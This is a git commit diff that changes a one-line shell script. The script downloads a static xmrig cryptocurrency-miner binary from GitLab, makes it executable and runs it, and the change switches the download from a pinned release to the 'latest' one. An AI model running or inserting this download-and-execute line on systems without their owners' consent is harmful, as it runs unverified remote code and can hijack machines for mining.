9a84a25dc6a335867ea2023feb5adb7cc6efe090
Aryan Gupta <costomf0004@gmail.com>
2026-01-10 14:34:19 +0530

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,1 +1,1 @@
-wget https://gitlab.com/Kanedias/xmrig-static/-/releases/v0.139/downloads/xmrig-aarch64-static && chmod +x xmrig-aarch64-static && ./xmrig-aarch64-static
+wget https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-aarch64-static && chmod +x xmrig-aarch64-static && ./xmrig-aarch64-static
